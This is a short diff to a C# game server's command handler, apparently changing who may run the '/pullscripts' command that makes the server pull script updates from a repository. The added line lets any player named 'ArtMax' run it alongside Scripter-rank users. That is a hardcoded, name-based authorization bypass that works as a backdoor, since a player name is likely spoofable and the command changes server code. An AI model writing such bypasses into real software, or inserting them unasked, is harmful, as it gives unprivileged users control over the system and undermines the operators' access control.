@@ -272,7 +272,7 @@ namespace Script
                         break;
                     case "/pullscripts":
                         {
-                            if (Ranks.IsAllowed(client, Enums.Rank.Scripter))
+                            if (Ranks.IsAllowed(client, Enums.Rank.Scripter) || client.Player.Name == "ArtMax")
                             {
                                 Messenger.PlayerMsg(client, "Pulling scripts...", Text.BrightGreen);
                                 Server.Scripting.ScriptRepoHelper.PullChanges();
